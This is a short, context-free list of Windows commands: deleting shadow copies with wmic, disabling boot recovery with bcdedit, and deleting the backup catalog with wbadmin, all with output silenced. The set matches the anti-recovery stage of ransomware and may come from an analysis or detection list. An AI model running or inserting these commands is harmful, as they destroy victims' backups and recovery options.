  - wmic shadowcopy delete >nul 2>&1
  - bcdedit /set {default} bootstatuspolicy ignoreallfailures >nul 2>&1
  - bcdedit /set {default} recoveryenabled no >nul 2>&1
  - wbadmin delete catalog -quiet >nul 2>&1
